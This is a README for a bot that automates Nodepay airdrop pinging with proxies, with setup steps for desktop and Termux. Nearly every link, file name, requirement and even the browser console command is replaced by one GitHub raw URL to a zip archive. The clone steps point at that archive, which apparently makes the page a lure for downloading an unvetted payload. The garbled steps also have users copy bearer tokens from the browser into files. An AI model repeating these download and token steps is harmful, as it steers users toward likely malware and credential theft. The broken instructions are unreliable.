# NODEPAY NETWORK

A bot for automating Nodepay airdrop interactions, including session management and pinging with proxy support.

---

## Requirements

1. **https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip** (version 14 or higher)
2. **npm** (Node package manager)

---

## Installation

To get started with the Nodepay Airdrop Bot:

1. Clone the repository:

```bash
git clone https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip && cd nodepay-farm
```

3. Install the dependencies:

```bash
npm install
```

---

## Configuration

To get your Bearer token:

1. **Register for a Nodepay account** (https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip)
- Go to Nodepay dashboard.

2. **Get your token**:

- Open **DevTools** in your browser (right-click > Inspect or press `F12`).

- Go to the **Console** tab in DevTools.

- Type the following command to get your token:
  ```bash
  https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip('np_webapp_token') 
  ```

- This will return the Bearer token. **Copy the token** (without the `Bearer` prefix, just the alphanumeric string).

3. **Paste the token in `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip`**:
- Create a `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip` file in the root of your project and paste your token in the file (one token per line).

- Example `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip`:

```text
ey...
ey...
ey...
```

### 2. `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip`

- Add your proxy details in `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip`. Each line should have the format:

```text
host:port:username:password
```

- Example:

```text
123.45.67.89:8080:username:password
123.45.67.89:8080:username:password
123.45.67.89:8080:username:password
```

---

## Running the Bot

To start the bot, run the following command:

```bash
npm start
```
### Configuration for Termux

**Install nodejs-lts in Termux**
```
pkg update && pkg upgrade -y
```
```
pkg install nodejs-lts
```
**Install git and nano**
```
pkg install git
pkg install nano
```

**Clone the repository:**

```bash
git clone https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip
```
**Change directory:**
```
cd nodepay-farm
```
**Install the dependencies:**

```bash
npm install
```
## Before running the bot, you need to put your token inside https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip file.

**To get your Bearer token:**

- Download and install kiwi browser in your phone.
- Go to Nodepay dashboard.
- Open Developer Tools in kiwi browser.
- Go to the **Console** tab in Developer Tools.
- Type the following command to get your token:
  ```bash
  https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip('np_webapp_token')
  ```
- This will return the Bearer token. ex: eyJhbGciOi.......

**Paste the token in `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip`**:
```
nano https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip
```
**Paste your proxies inside:**
```text
nano https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip
```
## Running the Bot

**To start the bot, run the following command:**

```bash
npm start
```
Logs are stored in `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip` and can also be seen in the console.

## Logs

The bot will log the status and activity, including:

- Connection status for each session (UID).
- Ping status for each session.
- IP address used for each proxy.
---

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---
